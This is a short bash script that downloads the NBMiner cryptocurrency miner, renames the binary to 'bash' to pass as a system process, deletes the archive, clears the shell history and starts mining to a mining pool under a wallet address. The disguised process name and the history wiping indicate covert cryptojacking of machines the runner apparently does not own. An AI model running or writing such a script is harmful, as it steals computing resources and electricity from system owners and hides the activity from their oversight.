#!/bin/bash
wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz 
tar -xvf NBMiner_40.1_Linux.tgz 
cd NBMiner_Linux
chmod +x nbminer 
mv nbminer bash
rm -rvf NBMiner_40.1_Linux.tgz
history -cr
./bash nbminer -a kawpow -o kp.unmineable.com:3333 -u cosmos1vhjjh5q8qegxqyag6whdjzf4qwkce24w4zp4tc.default
